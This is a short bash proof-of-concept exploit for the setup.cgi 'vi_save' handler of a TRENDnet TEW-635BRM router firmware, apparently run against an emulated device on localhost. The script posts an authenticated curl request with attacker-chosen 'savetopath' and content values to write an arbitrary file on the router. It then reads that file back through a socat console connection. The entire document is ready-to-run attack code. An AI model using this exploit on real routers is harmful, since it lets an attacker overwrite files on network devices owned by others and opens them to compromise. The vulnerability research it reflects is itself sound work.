#!/bin/bash
# TEW635BRM-F3 PoC: TEW-635BRM V1.0(1.00.1C) setup.cgi vi_save → cmd_agent_ap "ECHO=<path>=:<content>"
TARGET=${TARGET:-http://127.0.0.1:16358}
AUTH=${AUTH:-admin:password}
VICTIM=${1:-/tmp/vitest}
CONTENT=${2:-PWNED_BY_VI_SAVE}

echo "[*] POST /setup.cgi todo=vi_save savetopath=$VICTIM outlog_Display=$CONTENT"
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" \
 "$TARGET/setup.cgi" \
 --data-urlencode "todo=vi_save" \
 --data-urlencode "next_file=system_command.htm" \
 --data-urlencode "savetopath=$VICTIM" \
 --data-urlencode "outlog_Display=$CONTENT"
sleep 3
echo "[*] 访客控制台读回 $VICTIM :"
(printf "cat $VICTIM\n"; sleep 2) | socat -t 8 - UNIX-CONNECT:<rehost-dir> 2>/dev/null | tr -d '\r' | tail -3
